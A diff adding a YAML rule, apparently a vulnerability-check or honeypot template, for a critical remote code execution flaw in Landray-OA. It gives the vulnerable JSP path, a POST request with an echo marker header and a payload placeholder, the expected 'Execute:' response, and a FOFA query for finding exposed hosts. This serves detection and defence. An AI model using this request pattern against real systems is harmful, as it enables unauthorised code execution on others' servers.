@@ -1,0 +1,29 @@
+id: landray-oa-sysSearchMain-editParam-rce
+info:
+  name: Landray-OA - Remote code Execution
+  author: SleepingBag945
+  description: Landray-OA through sysSearchMain editParam is vulnerable to Remote
+    Code Execution.
+  severity: critical
+  reference:
+  - https://www.modb.pro/db/555240
+  - https://github.com/mhaskar/XMLDecoder-payload-generator
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Landray-OA系统"
+  tags: landray,rce
+traps:
+- request:
+    method: POST
+    path: /sys/ui/extend/varkind/custom.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Test: echo {{randstr}}
+    body: 'var={{payload}}
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: Execute:{{randstr}}
